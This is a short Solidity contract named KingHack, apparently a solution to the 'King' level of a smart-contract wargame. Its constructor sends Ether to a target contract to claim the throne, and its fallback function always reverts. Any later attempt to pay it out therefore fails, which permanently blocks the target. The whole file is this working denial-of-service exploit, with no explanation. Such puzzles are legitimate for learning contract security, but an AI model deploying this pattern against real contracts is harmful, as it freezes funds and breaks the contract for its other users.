pragma solidity ^0.6.0;

contract KingHack {

    address kingAddr; 
    
    constructor(address _kingAddress) public payable {
        address(_kingAddress).call{value: msg.value}(""); 
    }

    fallback() external payable{
        revert("forcing revert"); 
    }
    
}